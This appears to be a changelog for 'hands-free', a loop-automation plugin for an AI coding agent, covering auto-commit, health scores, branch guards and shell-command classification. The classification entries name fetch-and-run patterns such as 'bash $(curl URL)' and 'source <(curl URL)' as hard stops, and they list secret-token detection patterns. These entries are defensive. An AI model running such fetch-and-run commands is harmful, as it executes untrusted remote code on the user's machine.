# Changelog

## [2.47.0] — 2026-03-19

### Added
- `Loop iteration timeout: N` CLAUDE.md directive: fires a HARD STOP if a single iteration has been running for more than N minutes
- Check is opportunistic — evaluated at natural pause points (before/after major tool calls, before auto-commit), not a background timer
- After `/hands-free resume`, the current iteration is abandoned and the loop moves to the next iteration (timed-out iteration not retried)
- New row added to Available Persistent Settings table

## [2.46.0] — 2026-03-19

### Added
- `Loop max changes: N` CLAUDE.md directive: fires a HARD STOP if the number of files changed in a single iteration exceeds N
- File count via `git status --short` line count — includes staged, unstaged, and new untracked files; excludes `.gitignore`d files
- Check runs after all edits complete, before auto-commit
- After `/hands-free resume`, the iteration proceeds to auto-commit despite the excess; limit not re-checked for the same iteration
- New row added to Available Persistent Settings table

## [2.45.0] — 2026-03-19

### Added
- `Loop commit prefix: <prefix>` CLAUDE.md directive: replaces `[ralph #N]` tag in loop mode auto-commit messages
- Supports `{N}` placeholder in the prefix for iteration number injection (e.g., `iter-{N}:` → `iter-3: feat: ...`)
- Applies only to auto-commits made during loop mode; non-loop commits unaffected
- New row added to Available Persistent Settings table

## [2.44.0] — 2026-03-19

### Added
- `Loop test command: <cmd>` CLAUDE.md directive: overrides auto-detected test runner for all loop health checks
- Override applies to build health check, promise evaluation, regression tracking, max-failures, and auto-stop health floor
- Exit code 0 = pass; non-zero = fail; failure count extracted from output on best-effort basis
- When absent, auto-detection from project type (Rust/Python/TypeScript/Go) proceeds as before
- New row added to Available Persistent Settings table

## [2.43.0] — 2026-03-19

### Added
- `Loop abort on regression: on/off` CLAUDE.md directive: fires a HARD STOP when failing test count increases between iterations
- Comparison is skipped on the first iteration (no prior baseline)
- Baseline resets after user runs `/hands-free resume`, preventing repeated HARD STOPs for the same regression
- Compatible with `Loop max failures` — both directives can be active simultaneously
- New row added to Available Persistent Settings table

## [2.42.0] — 2026-03-19

### Added
- `Loop quiet mode: on/off` CLAUDE.md directive: suppresses routine per-iteration announcements for cleaner long-loop output
- Suppressed in quiet mode: iteration-start status lines, cooldown/backoff wait notices, auto-commit messages, auto-push success confirmations
- Always printed regardless of quiet mode: warnings, HARD STOPs, mandatory review checkpoints, auto-stop notices, completion promise, final-iteration warnings
- Session log still captures all events; quiet mode only affects conversation output
- New row added to Available Persistent Settings table

## [2.41.0] — 2026-03-19

### Changed
- `Loop auto-push` push failure handling upgraded from silent-continue to HARD STOP
- Push failures now fire: `[hands-free] HARD STOP — Auto-push failed: <error>. Resolve the issue and run /hands-free resume to continue.`
- Added pre-push announcement: `[hands-free] Auto-push: pushing N commit(s) to origin/<branch>`
- Added success confirmation: `[hands-free] Auto-push: pushed successfully`
- Available Persistent Settings table updated to reflect HARD STOP semantics

## [2.40.0] — 2026-03-19

### Added
- `Loop backoff: on/off` CLAUDE.md directive: automatically increases the wait between iterations after consecutive failures
- Backoff sequence: 0s → 30s → 60s → 120s → 240s → 300s (cap); doubles after each additional consecutive failure
- Resets to 0s after any iteration where all tests pass — one passing iteration cancels all accumulated backoff
- Effective wait = max(Loop cooldown value, current backoff value) when both directives are active
- Announces wait before applying: `[hands-free] Backoff: waiting <X>s after <N> consecutive failures`
- New row added to Available Persistent Settings table

## [2.39.0] — 2026-03-19

### Added
- `Loop session stats: on/off` CLAUDE.md directive: outputs an aggregate session summary when the loop ends
- Summary includes: total iterations, completed/skipped/failed counts, total commits, final test state, elapsed time, end reason
- Fires regardless of how the loop ends (promise met, max-iterations, user stop, HARD STOP)
- Compatible with `Loop iteration summary: on`; both can be active simultaneously
- New row added to Available Persistent Settings table

## [2.38.0] — 2026-03-19

### Added
- `Loop iteration summary: on/off` CLAUDE.md directive: outputs a brief structured summary (status, commits, tests, warnings) at the end of each iteration to the conversation
- Summary fires for all iteration outcomes: completed, skipped, paused, hard-stop
- Distinct from `Loop notes: on` which writes to `.claude/loop-notes.md`; both can be used together
- New row added to Available Persistent Settings table

## [2.37.0] — 2026-03-19

### Added
- `Loop cooldown: N` CLAUDE.md directive: enforces a minimum N-second pause between the end of one iteration and the start of the next
- If the iteration itself took longer than N seconds, no artificial delay is added
- Cooldown applies only to automatic iteration flow, not after manual resume from a pause/HARD STOP
- New row added to Available Persistent Settings table

## [2.36.0] — 2026-03-19

### Added
- `Loop pre-iteration: <command>` CLAUDE.md directive: runs a setup command at the start of each iteration before any work begins
- Hook failure (non-zero exit) fires a HARD STOP — the iteration does not proceed until the user resolves the issue and runs `/hands-free resume`
- Contrast with on-failure (advisory) and on-complete (one-shot): pre-iteration is mandatory and blocking
- Same cwd-scope and HARD STOP rules apply as all other shell commands
- New row added to Available Persistent Settings table

## [2.35.0] — 2026-03-19

### Added
- `Loop on-failure: <command>` CLAUDE.md directive: runs a shell command after each iteration that ends with test failures
- Hook fires once per failed iteration (may fire many times across a session, unlike on-complete which fires once)
- Hook failure is announced but does not halt loop execution
- Same cwd-scope and HARD STOP rules apply as all other shell commands
- New row added to Available Persistent Settings table

## [2.34.0] — 2026-03-19

### Added
- `Loop skip-if-unchanged: on/off` CLAUDE.md directive: skips an iteration when `git status --porcelain` reports a clean working tree
- "Clean" defined: no modified, staged, or untracked files (`.gitignore`'d files are excluded from the check)
- Skipped iterations are logged in the session log; combining with stall detection recommended for comprehensive coverage
- New row added to Available Persistent Settings table

## [2.33.0] — 2026-03-19

### Added
- `Loop on-complete: <command>` CLAUDE.md directive: runs a shell command once before the completion promise is output
- Hook failure is announced but does not suppress promise delivery
- Same cwd-scope and HARD STOP rules apply as all other shell commands
- New row added to Available Persistent Settings table

## [2.32.0] — 2026-03-19

### Added
- `Loop max duration: N` CLAUDE.md directive: fires a HARD STOP at the start of an iteration when total loop session time exceeds N minutes
- Check runs at iteration boundaries only — in-progress iterations are never interrupted
- `/hands-free resume` continues; duration re-evaluated at next iteration start
- New row added to Available Persistent Settings table

## [2.31.0] — 2026-03-19

### Added
- `Loop checkpoint tags: on/off` CLAUDE.md directive: creates lightweight git tag `loop-iter-N` after each iteration's commits
- Tags created after auto-commits, before auto-push; not pushed automatically
- No tag created if the iteration produced no new commits
- New row added to Available Persistent Settings table

## [2.30.0] — 2026-03-19

### Added
- `Loop auto-push: on/off` CLAUDE.md directive: automatically pushes to origin after each iteration's auto-commits when enabled
- Requires `Auto-commit: on` to have effect; silently disabled otherwise
- Push skipped on loop-skip, HARD STOP, no new commits, or push failure (non-halting error)
- New row added to Available Persistent Settings table

## [2.29.0] — 2026-03-19

### Added
- `Loop notes: on/off` CLAUDE.md directive: appends a per-iteration summary to `.claude/loop-notes.md` when enabled
- Entry captures iteration number, timestamp, status, files changed, test outcome, warnings, and duration
- Notes file is not auto-committed (session artifact); recommend adding to `.gitignore`
- New row added to Available Persistent Settings table

## [2.28.0] — 2026-03-19

### Added
- `Loop max failures: N` CLAUDE.md directive: fires a HARD STOP after N consecutive iterations all end with test failures
- Failure count resets to zero when any iteration completes with all tests passing
- Indeterminate test results do not increment the failure count
- New row added to Available Persistent Settings table

## [2.27.0] — 2026-03-19

### Added

**Loop Quiet Mode**
- `Loop quiet: on/off` CLAUDE.md directive — suppresses routine per-iteration output in long loop runs
- Suppressed: iteration start banners, routine auto-accept announcements, routing decisions, review checkpoint skip messages, auto-rebase success
- Always shown regardless: hard stops, warnings (branch guard, budget exceeded, stall detection, consecutive failure), auto-commit messages, completion promise, 10-iteration cadence summaries
- Session log (`/hands-free log`) captures all events regardless of quiet mode
- Default: `off` — all announcements appear as normal
- New `### Loop Quiet Mode` sub-section in `## Ralph Loop Integration`
- Directive added to Available Persistent Settings table

## [2.26.0] — 2026-03-19

### Added

**Loop Auto-Rebase**
- `Loop auto-rebase: on/off` CLAUDE.md directive — when `on`, runs `git pull --rebase` at the start of every iteration before any work begins
- Success: announces `[hands-free] Auto-rebase: synced with upstream (N new commits applied)`
- Conflict: issues a HARD STOP — `[hands-free] HARD STOP — auto-rebase conflict detected` and pauses for user resolution
- Default: `off` (no automatic rebasing)
- Note: does not stash uncommitted changes; if unstaged changes exist, the rebase may fail and trigger the HARD STOP
- New `### Loop Auto-Rebase` sub-section in `## Ralph Loop Integration`
- Directive added to Available Persistent Settings table

## [2.25.0] — 2026-03-19

### Added

**Iteration Time Budget**
- `Loop iteration budget: N` CLAUDE.md directive — warns when an iteration runs longer than N minutes
- When exceeded, announces once per iteration: `[hands-free] Warning: iteration N has run for X minutes (budget: N min) — consider /hands-free loop-skip to advance or wait for natural completion`
- Warning is advisory only; hands-free never auto-skips based on time alone
- Default: absent (no budget configured, no time tracking)
- New `### Iteration Time Budget` sub-section in `## Ralph Loop Integration`
- Directive added to Available Persistent Settings table

## [2.24.0] — 2026-03-19

### Added

**Loop Branch Guard**
- In loop-aware mode, checks the current git branch at the start of the first iteration
- If the active branch matches any branch in the protected list, announces an advisory warning: `[hands-free] Warning: loop is running on protected branch '<branch>' — consider switching to a feature branch`
- Warning is advisory only — the iteration proceeds normally; fires once per session to avoid noise
- Default protected branches: `main`, `master`
- New `### Loop Branch Guard` sub-section in `## Ralph Loop Integration` explains the rationale and behavior
- `Loop protected branches: <list>` CLAUDE.md directive — comma-separated list of protected branch names (default: `main,master`)
- `Loop branch guard: off` CLAUDE.md directive — disables the guard entirely for the project
- Both directives added to the Available Persistent Settings table

## [2.23.0] — 2026-03-19

### Added

**Loop Skip Command**
- `/hands-free loop-skip` — immediately stops all remaining work in the current iteration and signals the loop to advance to the next iteration
- Does NOT commit in-progress (unstaged) changes when skipping; if unstaged changes exist, announces a warning: `[hands-free] loop-skip: unstaged changes present — not committed`
- Announces: `[hands-free] Iteration skipped — advancing to next iteration`
- Skipped iterations do NOT consume the completion promise check — the promise is re-evaluated fresh at the start of the next iteration
- If invoked outside loop-aware mode, announces: `[hands-free] loop-skip has no effect outside loop mode`
- Loop-skip is logged: `[loop-skip] iteration N skipped — advancing`
- Added to Quick Reference table: "Discard remaining work in current iteration, advance to next"
- Added to Commands block with comment: "skip remaining work in current iteration and advance to next"
- New `loop-skip` row in `### Loop Pause and Resume Commands` table distinguishing it from `loop-pause` (loop-skip = abandon immediately, loop-pause = finish cleanly then pause)

## [2.22.0] — 2026-03-19

### Added

**Loop Pause/Resume Commands**
- `/hands-free loop-pause` — boundary pause: arms a flag so the loop pauses *after* the current iteration completes (not mid-iteration); announces `[hands-free] Loop-pause armed — will pause after this iteration completes`
- `/hands-free loop-resume` — clears the boundary-pause flag; announces `[hands-free] Loop-pause cleared — resuming loop`
- New `### Loop Pause and Resume Commands` sub-section in `## Ralph Loop Integration` documenting boundary pause vs. immediate pause distinctions
- Quick Reference table updated with loop-pause/loop-resume entries
- Commands block updated with loop-pause and loop-resume entries
- `/hands-free status` shows `Loop-pause: armed` when the flag is set

---

## [2.21.0] — 2026-03-19

### Added

**Iteration Timestamp Logging (`Loop timestamps:` directive)**
- New `Loop timestamps: on/off` CLAUDE.md directive in Available Persistent Settings table
- When `on`, prefixes every session log entry with `[HH:MM]` in 24h local time (e.g., `[14:23] [auto-commit] feat: add validation`)
- Session Log section updated with timestamped example block demonstrating the format
- Default is `off`; existing log format unchanged unless directive is present

---

## [2.20.0] — 2026-03-19

### Added

**Consecutive Failure Guard (Loop Auto-Stop)**
- Third auto-stop condition added to `### Loop Auto-Stop Conditions`: fires when the same failure identifier (first failing test name or build error first line) recurs unchanged for 3 consecutive iterations
- Announcement: `[hands-free] LOOP AUTO-STOP: Same failure repeated 3 iterations (<identifier>). Pausing for user review.`
- Session-memory tracking: counter resets when the failure changes or disappears
- Log format: `[auto-stop] consecutive-failure: <identifier> — iteration N halted`
- Two new CLAUDE.md overrides: `Loop failure guard: off` to disable the guard, `Loop failure repeat: N` to set a custom consecutive count (default: 3)

---

## [2.19.0] — 2026-03-19

### Added

**Custom Auto-Commit Tag (`Loop tag:` CLAUDE.md directive)**
- New `Loop tag:` directive in `## CLAUDE.md Override Reference` Available Persistent Settings table; format: `Loop tag: [loop #N]`; N replaced with iteration number at commit time
- `Loop tag: off` suppresses the tag prefix entirely — commits have no loop tag
- Default remains `[ralph #N]` when no directive is present
- Iteration-Aware Auto-Commits paragraph in `## Ralph Loop Integration` updated with tag configurability note referencing the CLAUDE.md directive

---

## [2.18.0] — 2026-03-19

### Added

**Loop-Mode Troubleshooting Entries**
- New `### Loop Mode Issues` group at end of `## Troubleshooting` with 5 Q&A entries covering the most common loop-mode failure scenarios:
  - Loop re-brainstorming instead of resuming (checkpoint SHA mismatch)
  - Auto-stop false positive (session-scoped consecutive counter resets)
  - Velocity stall false positive (completed_stories not written to checkpoint)
  - Health score stuck at 50 (test_summary missing from checkpoint)
  - Loop re-brainstorming every iteration (pending_stories null or active_plan_file not set)

## [2.17.0] — 2026-03-19

### Added

**Loop Completion Summary**
- When the completion promise evaluates to true, outputs a structured box-drawing summary block before routing to finishing-a-development-branch: iterations used, stories done, commits made, final health score with trend arrow, velocity trend sparkline
- Missing fields substitute `N/A` rather than omitting lines; summary fires exactly once per run; precedes the mandatory pre-push review checkpoint

### Changed

**Metrics Sparkline Alignment**
- `/hands-free metrics` sparkline mapping updated from legacy 6-category rule to the v2.16.0 standardized 8-level formula: value 0→▁; max→█; all equal non-zero→all █; others scaled linearly

## [2.16.0] — 2026-03-19

### Added

**Velocity Sparkline in Iteration Announcement**
- `velocity_trend` rendered as a Unicode block sparkline (▁▂▃▄▅▆▇█) appended to the `velocity` line in the iteration announcement: `velocity: [3,2,4,0,1] ▄▃▆▁▂`
- Sparkline mapping: 8 Unicode block levels; value 0 always → ▁; max value → █; all values equal and non-zero → all ██; intermediate values scaled linearly; empty/missing array → line omitted
- `Loop velocity:` line added to `/hands-free status` loop section with sparkline: `Loop velocity: [3,2,4,0,1] ▄▃▆▁▂`; omitted when velocity data unavailable

## [2.15.0] — 2026-03-19

### Added

**Loop Auto-Stop Conditions**
- Health floor auto-stop: if `health_score < 25` (configurable via `Loop health floor: N` in CLAUDE.md) for 3 consecutive iterations, hands-free announces `[hands-free] LOOP AUTO-STOP: Health floor breached (score: N for 3 iterations). Pausing for user review.` and halts the current iteration
- Zero-progress auto-stop: if all 5 entries of `velocity_trend` are `0`, hands-free announces `[hands-free] LOOP AUTO-STOP: No story progress in last 5 iterations. Pausing for user review.` and halts the current iteration
- Halting an iteration stops work, omits the completion promise, and logs `[auto-stop] <condition> — iteration N halted` in the session log; ralph-loop itself is NOT terminated
- CLAUDE.md overrides: `- Loop auto-stop: off` disables both conditions; `- Loop health floor: N` sets a custom health floor threshold (default: 25)
- Both overrides added to the "Available Persistent Settings" table in `## CLAUDE.md Override Reference`

## [2.14.0] — 2026-03-19

### Added

**Health Score History & Trend Analysis**
- `health_history` field in `.claude/iteration-checkpoint.json`: FIFO int[] of last 5 health scores (oldest first), updated on every checkpoint write by appending `health_score` then pruning to 5; omitted when `health_score` is null
- Trend direction computed from `health_history`: improving (↑) when last > first, declining (↓) when last < first, stable (→) otherwise or when insufficient data
- Trend arrow appended to `health` line in iteration announcement: `health: 87/100 (T:100 S:80 V:100 C:80) ↑`
- Regression warning when `health_score < max(health_history) − 20`: `[hands-free] Warning: Health regression — score dropped N points from peak (peak: X, current: Y). Review failing pillars.` (informational, does not pause the loop)
- `health_history` field definition added to checkpoint field table

---

## [2.13.0] — 2026-03-19

### Added

**Loop Health Score**
- Composite 0-100 health score computed each iteration from four pillars: Test Health (T), Security Health (S), Velocity Health (V), Commit Health (C)
- Pillar formulas: T = proportional test pass rate (0 failures=100, no data=50); S = A→100, B→80, C→60, D→40, F→0, null=50; V = zero-count in last 3 velocity_trend entries (0→100, 1→60, 2→30, stall→0, insufficient→100); C = commits>0→100, else 50
- Overall score = integer average of four pillars (round half-up), stored as `health_score` (int 0-100) in `.claude/iteration-checkpoint.json`
- `### Loop Health Score` sub-section under `## Ralph Loop Integration` with pillar table and null-handling rules
- `health_score` field added to checkpoint JSON schema and field definitions table
- Iteration start announcement now shows `health: N/100 (T:X S:X V:X C:X)` line when checkpoint has a health score
- `/hands-free status` shows `Loop health: N/100 (T:X S:X V:X C:X)` in loop-aware mode; `Loop health: N/A` otherwise
- DEGRADED pre-flight announcements append `[Health: N/100]` when a prior health score is available

---

## [2.12.0] — 2026-03-19

### Added

**Loop Metrics & Velocity Tracking**
- `metrics` object in `.claude/iteration-checkpoint.json`: `stories_completed_this_iteration`, `commits_this_iteration`, `velocity_trend` (FIFO array of last 5 story counts), `total_stories_completed`, `total_commits`
- `### Metrics Tracking` sub-section under `## Ralph Loop Integration`: update rules, FIFO pruning, initialisation from zero
- `/hands-free metrics` command: read-only velocity table (last 5 iterations) + sparkline (▁▂▃▄█) + totals footer; 4 output states (present/missing-field/no-file/malformed)
- Velocity stall detection: if last 3 entries of `velocity_trend` are all `0`, fire velocity-specific stall warning alongside existing same-test and same-files checks
- `## Metrics` section in PR auto-description body: average velocity, total stories/commits, sparkline trend
- `/hands-free metrics` added to Commands block and Quick Reference table

---

## [2.11.0] — 2026-03-19

### Added

**Branch Safety Guard**
- `### Branch Safety Guard`: in loop mode, detects when running on a protected branch (`main`, `master`, `trunk`, `develop`, `production`, `release`); auto-creates feature branch `ralph/loop-YYYYMMDD-N` and switches to it
- Pre-flight condition 3 (renumbered existing 3→4, 4→5): on protected branch → DEGRADED, auto-create and switch to feature branch
- `git push` to protected branches blocked in loop mode with message pointing to `/hands-free pr-description`; applies even in crazy-workspace mode
- CLAUDE.md overrides: `Loop protected branches: main, master` (custom list) and `Loop branch guard: off` (disable)
- `branch` field added to `### Iteration Context Checkpoint` JSON schema and field definitions table
- Checkpoint announcement includes `branch:` line; notes branch change with `⚠ branch changed` annotation when current branch differs from checkpoint

## [2.10.0] — 2026-03-19

### Added

**PR Auto-Description**
- `### PR Auto-Description`: when `finishing-a-development-branch` phase starts in loop mode, auto-generates a ready-to-paste PR title and body using checkpoint data (completed stories, test summary, security grade, iteration count)
- Title derived from epic title, last meaningful commit message (stripped of `[ralph #N]` and conventional commit prefix), or fallback
- Body includes: Summary (story list), Test Results, Security Posture, Iteration Stats, auto-generated footer
- Falls back to git-log-only body when no checkpoint is available
- `/hands-free pr-description`: on-demand PR description generator; same output as finishing-branch auto-description; outputs `gh pr create` command hint
- `/hands-free pr-description` added to Commands block and Quick Reference table

## [2.9.0] — 2026-03-19

### Added

**Test Regression Guard**
- `### Test Regression Guard`: pre-commit check runs the project's test suite and compares `current_failed` against `checkpoint.test_summary.failed`; if new failures appeared, blocks the commit and routes to systematic-debugging with the delta
- Block announce format: `[auto-commit] Blocked — N new test failure(s) detected (was M, now M+N). Routing to systematic-debugging.`
- Regression check skipped when no checkpoint, stale checkpoint, or no test runner detected
- `/hands-free test-baseline`: run tests now and record pass/fail counts as the new baseline; updates `test_summary` in checkpoint file; creates minimal checkpoint if none exists
- `/hands-free test-baseline` added to Commands block and Quick Reference table

## [2.8.0] — 2026-03-19

### Added

**Iteration Context Checkpoint**
- `### Iteration Context Checkpoint`: loop writes `.claude/iteration-checkpoint.json` after each auto-commit, recording iteration number, last commit SHA + message, completed stories, pending stories, test summary, security grade, and active plan file
- Checkpoint is auto-gitignored; format defined with field definitions table and JSON schema example
- `### Loop-Aware Behavior` updated: reads checkpoint at iteration start; stale-SHA guard (SHA not in `git log --oneline -50` → skip); malformed-JSON fallback
- Enhanced iteration announcement: when checkpoint is fresh, prints rich context block (last commit, stories done/pending, test counts, security grade) instead of one-liner
- No re-brainstorming with fresh checkpoint: when `pending_stories` is non-empty, route directly to executing-plans; skip brainstorming and writing-plans phases
- `/hands-free context`: new read-only command prints the checkpoint summary on demand; four output states (fresh / missing / stale / malformed)
- `/hands-free context` added to Commands block and Quick Reference table

## [2.7.0] — 2026-03-19

### Added

**Security Remediation Automation**
- `### Auto-Fix Behavior`: two-phase dry-run-first protocol auto-fixes medium/low vulnerabilities using `npm audit fix`, `pip-audit --fix`, and `bundle update --conservative`; `cargo audit` has no dry-run, so it emits a fix command instead
- `### High/Critical Fix Commands`: HARD STOP messages now include copy-paste-ready fix commands (`npm audit fix --force`, `cargo update -p <crate>`, `pip install --upgrade <pkg>==<version>`) so users know exactly what to run
- `/hands-free security fix` subcommand: on-demand remediation — detects project type, runs scanner, applies auto-fix for medium/low, emits fix commands for high/critical, updates posture grade
- `/hands-free security fix` added to Commands block and Quick Reference table
- `### Remediation History`: `remediation_history` array in `.claude/security-posture.json` records each fix attempt (date, scanner, severity_fixed, command, outcome); capped at 20 entries (FIFO)
- Loop stall detection via remediation history: 3 consecutive `failed` outcomes for same scanner → route to systematic-debugging

## [2.6.0] — 2026-03-19

### Added

**Workspace Health & Pre-flight Checks**
- `/hands-free health` command: four-section report (Git State, Build State, Test State, Security Posture) with overall verdict: `HEALTHY` / `DEGRADED` / `BLOCKED`
- Pre-flight check runs at the start of every loop iteration before build health check — detects merge conflicts, detached HEAD, staged uncommitted changes, and unstaged modifications
- BLOCKED state: iteration halts with announcement when conflicts or detached HEAD are present; loop continues to next iteration
- DEGRADED state: auto-heals staged changes (auto-commit) and unstaged modifications (auto-stash), announces fix, continues
- Auto-stash/unstash pattern: automatically stashes tracked modified files before `git pull --rebase`, restores after; stash message includes iteration number for identifiability
- If `git stash pop` fails (merge conflict with pulled changes), stash is preserved at `stash@{0}` and iteration is set to BLOCKED
- `/hands-free health` is read-only — diagnostics only; auto-healing is loop pre-flight only
- Pre-flight table documents all four conditions, actions, and announce messages

## [2.5.0] — 2026-03-19

### Added

**Security Automation Toolkit**
- Pre-commit security scanning runs automatically before every auto-commit; project-type-aware (detects Rust/Python/Node/pip from root files)
- Supported scanners: `cargo audit`, `bandit`, `npm audit`, `pip-audit`, `semgrep` (local rules only)
- Critical findings block auto-commit with announcement; high findings warn only; medium/low logged silently
- Severity normalization maps scanner-specific levels (bandit HIGH, npm moderate, cargo error) to canonical critical/high/medium/low
- Security posture grade (A–F) computed after each scan and written to `.claude/security-posture.json`
- `/hands-free security` command: displays current vulnerability summary by severity; `--scan` flag forces immediate rescan
- CLAUDE.md `# hands-free security` section: `block-on: critical/high/none`, `skip-scanners:`, `allow-patterns:` overrides
- Scan output files auto-added to `.gitignore` on first scan: `security-scan.log`, `security-posture.json`, `security-report.md`
- Grade displayed in `/hands-free status` output and in ralph-loop iteration announcements
- Loop integration: auto-commit messages tagged with security grade (`[ralph #N] feat: add X [security: A]`); grade C/D/F reroutes to systematic-debugging with top findings as context

**Enhanced Secrets Detection**
- Extended assignment patterns: `webhook_secret=`, `encryption_key=`, `jwt_secret=`, `session_secret=`, `master_key=`
- JWT token detection: `eyJ` literal prefix in non-test code
- Cloudflare token patterns: `CF_API_TOKEN=` (non-placeholder), `CF_API_KEY=`
- HashiCorp Vault tokens: `s.` (24+ chars), `hvs.` prefix
- GITHUB_TOKEN, GITLAB_TOKEN environment variable assignment patterns

**Documentation**
- `## Security Automation` section added with scanner reference, severity table, posture grades, override syntax, graceful degradation, and troubleshooting
- README `## Security Automation` section added

## [2.3.0] — 2026-03-17

### Added (iteration 6–7)

**New command**
- `/hands-free check <command>` — preview command classification (auto-pass / ask / HARD STOP) without running it; shows matched rule and safe alternative for hard stops
- Quick Reference table updated with `/hands-free check`

**Security**
- Shell script content scan: Edit/Write tool scans script content for hard stop patterns before writing; applies in all modes including crazy-workspace
- Subshell `$(...)` rule: `bash $(curl URL)` → HARD STOP; inner command's classification propagates to outer
- Complex shell constructs (`if/for/while/case`): classified by most restrictive branch
- Heredoc pattern rule: local DB heredoc → auto-pass; remote DB or POST heredoc → ask
- Secrets expanded: Slack tokens (`xoxb-`, `xoxp-`), PGP key marker, `client_secret=`, `totp_secret=`, `smtp_password=`, `ftp_password=`, `sftp_password=`, `access_key=`, `auth_token=`, `X-Auth-Token:` header, connection string passwords
- Security Philosophy section explaining WHY hard stops exist

**Tool coverage — Python**
- `uv sync`, `uv add`, `uv remove`, `uv venv`, `uv pip compile`, `uv tool run` → auto-pass
- `poetry install/add/run`, `pipenv install/run` → auto-pass
- `black`, `isort`, `bandit`, `safety`, `coverage run/html`, `pytest --cov` → auto-pass
- `hatch build/run`, `python -m build`, `flit build` → auto-pass

**Tool coverage — TypeScript/Frontend**
- `tsup`, `vite build/dev`, `esbuild`, `rollup` → auto-pass (bundlers)
- `biome check/format`, `ts-node`, `tsx`, `npx prettier --write/--check` → auto-pass
- `vitest watch`, `jest --watchAll` → auto-pass

**Tool coverage — Rust**
- `cargo nextest run`, `cargo expand`, `cargo fix`, `cargo clippy --fix`, `cross build`, `cargo miri test` → auto-pass
- `cargo watch -x run/test`, `cargo outdated`, `cargo tree`, `cargo deny check`, `cargo machete` → auto-pass
- `cargo install --path .` → ask (writes to `~/.cargo/bin`)

**Tool coverage — Build systems**
- `cmake -B build -S .`, `cmake --build build`, `ninja -C build`, `meson setup/compile` → auto-pass
- `make clean/all/lint/fmt/check` → auto-pass; `make install/uninstall` → ask

**Tool coverage — Services**
- `uvicorn/gunicorn` localhost → auto-pass; `--host 0.0.0.0` → ask
- `flask run`, `python manage.py runserver` → auto-pass
- `pm2 list` → auto-pass; `pm2 start/stop/restart` → ask
- `act`, `circleci local execute` → auto-pass (local CI runners)

**Tool coverage — Docker**
- `docker cp`, `docker logs`, `docker inspect`, `docker pull` → auto-pass
- `docker run --rm` with well-known image → auto-pass; unfamiliar image → ask
- `docker buildx build` → auto-pass

**Tool coverage — Redis**
- `redis-cli` read ops on localhost → auto-pass; write/destructive ops and remote hosts → ask

**Tool coverage — SQL DDL**
- `psql -c "DROP TABLE"` / `TRUNCATE` → ask even on local DB
- `psql -c "SELECT"` / `INSERT` / `CREATE TABLE` (local) → auto-pass
- `sqlite3 ./db "INSERT"` → auto-pass; `sqlite3 ./db "DROP TABLE"` → ask

**Git**
- `git pull`, `git pull --rebase` → auto-pass in full; ask in partial
- `git pull --ff-only` → auto-pass (safe fast-forward)
- `git rebase --continue/skip/abort`, `git cherry-pick --continue/abort`, `git merge --abort` → auto-pass
- `git apply ./patch.diff`, `git am ./patches/` → auto-pass (local patches)
- `git stash drop`, `git stash clear` → ask (irreversible)
- `git ls-files`, `git blame`, `git shortlog`, `git describe` → auto-pass

**Shell rules**
- System inspection commands: `ps aux`, `lsof`, `netstat`, `ss`, `df`, `du` → auto-pass (read-only)
- `jq`, `awk`, `sed`, `xargs`, `sort`, `uniq`, `head`, `tail`, `wc`, `tee` (cwd-scoped) → auto-pass
- `wget -O ./file URL` → auto-pass (downloads to cwd); `wget -O /outside URL` → ask
- `curl -s URL > ./file.json` → auto-pass (GET to cwd); `> /tmp/file` → ask
- `$CARGO_HOME`, `$GOPATH`, `$RUSTUP_HOME`, `$GOROOT` added to shell variable escape list
- Package updates: `cargo update`, `npm update`, `pnpm update`, `yarn upgrade` → auto-pass
- `pip install --upgrade <pkg>` (venv active) → auto-pass; (no venv) → ask
- `npm run <script>`: known-safe targets auto-pass; unknown/deploy targets ask
- `npx <well-known>` → auto-pass; `npx <unknown>@latest` → ask
- `git stash drop` / `git stash clear` → ask
- `cargo generate --git <url>` → ask; `cargo generate <local>` → auto-pass
- `./script.sh` / `bash ./script.sh` (cwd-scoped, known-safe content) → auto-pass

**Auto-commit edge cases**
- Detached HEAD → skip with announcement
- Bare repository → skip silently
- Staged files from previous task (not modified by Claude) → exclude from auto-commit

**CLAUDE.md behavior**
- User `/hands-free` commands override CLAUDE.md directives for the current session
- Project security rules in CLAUDE.md cannot be overridden by user commands
- `/hands-free status` shows active CLAUDE.md overrides

**Troubleshooting**
- "Auto-commit skipped in detached HEAD": create a branch first
- "Migration revert blocked": expected behavior; add CLAUDE.md override for dev databases
- "Redis commands blocked unexpectedly": add CLAUDE.md override for non-standard local hostnames
- `cargo install --path .` ask: expected; writes to `~/.cargo/bin`, not cwd

### Added (iteration 8 — batch 22–23)

**Shell rules — compound command improvements**
- Trivially safe commands transparent in compounds: `echo`, `printf`, `true`, `false`, `exit`, `read`, `sleep`, `date`, `pwd`, `ls`, `cat` — do NOT elevate classification
  - Example: `echo "Building..." && cargo build` → auto-pass
- Pipe (`|`) classification rule: classify each component independently; most restrictive wins; `cmd2 = bash/sh/zsh` → HARD STOP
- Process substitution `<(cmd)` rule: classify by inner command; `source <(curl URL)` → HARD STOP; `diff <(git show HEAD:file) ./file` → auto-pass
- Shell variable expansion in path args: known escape-list vars → ask; clearly local vars → cwd-scoped; unknown vars → ask (conservative)

**Build state health check — language-agnostic**
- Detect project language from root config files: `Cargo.toml` → `cargo build`; `pyproject.toml` → mypy/py_compile; `package.json` + `tsconfig.json` → `npx tsc --noEmit`; `go.mod` → `go build ./...`
- If no build tool detected → skip health check, route from git state only

**New command**
- `/hands-free recommend prune` — review and remove stale low-confidence observations from `preferences.md`; only removes observations that are superseded, contradicted, or have no reinforcement; medium/high rules never auto-pruned

**Known Limitations section** — 8 documented limitations:
- Session-scoped state (resets each conversation)
- No cross-session log persistence
- Concurrent sessions not coordinated (index.lock is the only signal)
- Static command classification (symlink edge case)
- Preference keys are skill-scoped
- Approval points in streaming output
- Tool result prompt injection caveat
- Shell alias inspection not possible

**Examples table** — 15 new entries:
- Pipe pipeline examples (cwd-scoped auto-pass, curl-escapes ask, find-escapes ask)
- Process substitution examples (`diff <(git show ...)`, `wc -l <(find /etc)`, `comm <(sort a) <(sort b)`)
- Shell variable examples (`rm -rf $BUILD_DIR` ask, `OUT=./dist && mkdir` auto-pass, `cp ./src $GOPATH/...` ask)
- Trivially safe transparent commands (`echo && cargo build`, `printf && git add`)

### Added (iteration 9 — batch 24–28)

**MCP tool classification**
- MCP tool naming heuristics: verb-prefix classification (get/fetch/list → read → auto; create/update/delete → write → ask; ambiguous → ask)
- Navigation/state-change browser tools classified as write even without write verb
- Playwright MCP tool-by-tool classification: `browser_snapshot/screenshot/console_messages` → auto; `browser_click/fill_form/type/evaluate` → ask; `browser_hover` → auto in full; `browser_install` → ask (system paths)
